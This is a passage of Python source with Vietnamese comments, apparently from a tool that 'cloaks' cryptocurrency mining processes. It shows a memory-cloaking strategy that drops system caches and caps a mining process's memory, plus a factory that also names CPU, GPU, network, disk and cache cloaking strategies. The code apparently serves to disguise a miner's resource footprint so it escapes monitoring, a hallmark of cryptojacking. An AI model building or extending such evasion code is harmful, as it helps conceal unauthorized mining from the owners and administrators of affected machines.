                f"Không đủ quyền để khôi phục cloaking Memory cho tiến trình {process.name} (PID: {process.pid})."
            )
            raise
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để khôi phục cloaking Memory cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi bất ngờ khi khôi phục cloaking Memory cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def calculate_memory_limit_mb(self) -> int:
        """
        Tính toán giới hạn bộ nhớ dựa trên memory_limit_percent.

        Returns:
            int: Giới hạn bộ nhớ tính bằng MB.
        """
        total_memory_bytes = psutil.virtual_memory().total
        memory_limit_bytes = int((self.memory_limit_percent / 100) * total_memory_bytes)
        memory_limit_mb = int(memory_limit_bytes / (1024 * 1024))
        self.logger.debug(f"Tính toán giới hạn bộ nhớ: {memory_limit_mb}MB.")
        return memory_limit_mb

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name


class MemoryCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking Memory:
      - Giới hạn sử dụng bộ nhớ của tiến trình.
      - Giảm sử dụng bộ nhớ bằng cách drop caches nếu cần thiết.
      - Khôi phục các thiết lập ban đầu khi không còn cần cloaking.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger
    ):
        """
        Khởi tạo MemoryCloakStrategy với cấu hình và logger.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Memory.
            logger (logging.Logger): Logger để ghi log.
        """
        # Lấy cấu hình memory_limit_percent với giá trị mặc định là 50%
        self.memory_limit_percent = config.get('memory_limit_percent', 50)
        if not (0 <= self.memory_limit_percent <= 100):
            logger.warning(f"Giá trị memory_limit_percent không hợp lệ: {self.memory_limit_percent}. Mặc định là 50%.")
            self.memory_limit_percent = 50
        self.logger = logger

        # Khởi tạo MemoryResourceManager và CacheResourceManager trực tiếp
        self.memory_resource_manager = MemoryResourceManager(logger)
        self.cache_resource_manager = CacheResourceManager(logger)

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng chiến lược cloaking Memory cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Drop caches sử dụng CacheResourceManager
            success_drop = self.cache_resource_manager.drop_caches()
            if success_drop:
                self.logger.info(f"Đã drop caches để giảm sử dụng cache cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.error(f"Không thể drop caches cho tiến trình {process_name} (PID: {pid}).")

            # Giới hạn sử dụng bộ nhớ sử dụng MemoryResourceManager
            memory_limit_mb = self.calculate_memory_limit_mb()
            success_limit = self.memory_resource_manager.set_memory_limit(pid, memory_limit_mb)
            if success_limit:
                self.logger.info(f"Đặt giới hạn bộ nhớ thành {self.memory_limit_percent}% ({memory_limit_mb}MB) cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.error(f"Không thể đặt giới hạn bộ nhớ thành {self.memory_limit_percent}% cho tiến trình {process_name} (PID: {pid}).")

            self.logger.info(
                f"Áp dụng cloaking Memory cho tiến trình {process_name} (PID: {pid}): "
                f"drop_caches=True, memory_limit_percent={self.memory_limit_percent}%."
            )

        except PermissionError as e:
            self.logger.error(
                f"Không đủ quyền để drop caches. Cloaking Memory thất bại cho tiến trình {process.name} (PID: {process.pid})."
            )
            raise
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking Memory cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi bất ngờ khi áp dụng cloaking Memory cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục các thiết lập cloaking Memory cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Reset cache usage bằng cách không giới hạn
            success_limit = self.cache_resource_manager.limit_cache_usage(100)  # Đặt lại về 100%
            if success_limit:
                self.logger.info(f"Khôi phục giới hạn cache cho tiến trình {process_name} (PID: {pid}) thành công.")
            else:
                self.logger.error(f"Không thể khôi phục giới hạn cache cho tiến trình {process_name} (PID: {pid}).")

            # Không cần drop caches lại khi khôi phục

            self.logger.info(
                f"Khôi phục cloaking Memory cho tiến trình {process_name} (PID: {pid}) đã hoàn thành."
            )

        except PermissionError as e:
            self.logger.error(
                f"Không đủ quyền để khôi phục cloaking Memory cho tiến trình {process.name} (PID: {process.pid})."
            )
            raise
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để khôi phục cloaking Memory cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi bất ngờ khi khôi phục cloaking Memory cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def calculate_memory_limit_mb(self) -> int:
        """
        Tính toán giới hạn bộ nhớ dựa trên memory_limit_percent.

        Returns:
            int: Giới hạn bộ nhớ tính bằng MB.
        """
        total_memory_bytes = psutil.virtual_memory().total
        memory_limit_bytes = int((self.memory_limit_percent / 100) * total_memory_bytes)
        memory_limit_mb = int(memory_limit_bytes / (1024 * 1024))
        self.logger.debug(f"Tính toán giới hạn bộ nhớ: {memory_limit_mb}MB.")
        return memory_limit_mb

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name


class CloakStrategyFactory:
    """
    Factory để tạo các instance của các chiến lược cloaking.
    """

    _strategies: Dict[str, Type[CloakStrategy]] = {
        'cpu': CpuCloakStrategy,
        'gpu': GpuCloakStrategy,
        'network': NetworkCloakStrategy,
        'disk_io': DiskIoCloakStrategy,
        'cache': CacheCloakStrategy,
        'memory': MemoryCloakStrategy
    }

    @staticmethod
    def create_strategy(
        strategy_name: str,
        config: Dict[str, Any],
        logger: logging.Logger
    ) -> Optional[CloakStrategy]:
        """
        Tạo một instance của chiến lược cloaking dựa trên tên chiến lược.

        Args:
            strategy_name (str): Tên của chiến lược cloaking.
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking.
            logger (logging.Logger): Logger để ghi log.

        Returns:
            Optional[CloakStrategy]: Instance của chiến lược cloaking hoặc None nếu không tìm thấy.
        """
        strategy_class = CloakStrategyFactory._strategies.get(strategy_name.lower())

        if strategy_class and issubclass(strategy_class, CloakStrategy):
            try:
                return strategy_class(config, logger)
            except Exception as e:
                logger.error(f"Lỗi khi tạo chiến lược cloaking '{strategy_name}': {e}")
                return None
        else:
            logger.warning(f"Không tìm thấy chiến lược cloaking: {strategy_name}")
            return None
